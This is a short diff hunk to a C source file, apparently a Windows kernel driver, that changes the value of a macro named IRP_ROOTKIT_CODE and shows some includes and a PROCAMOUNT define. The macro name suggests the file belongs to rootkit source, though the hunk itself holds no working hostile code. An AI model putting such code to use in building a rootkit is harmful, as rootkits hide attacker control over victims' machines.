@@ -9,7 +9,7 @@
 #include <ntimage.h>
 #include <stdarg.h>
 
-#define IRP_ROOTKIT_CODE 0x815
+#define IRP_ROOTKIT_CODE 0x972
 
 #define PROCAMOUNT 3
 
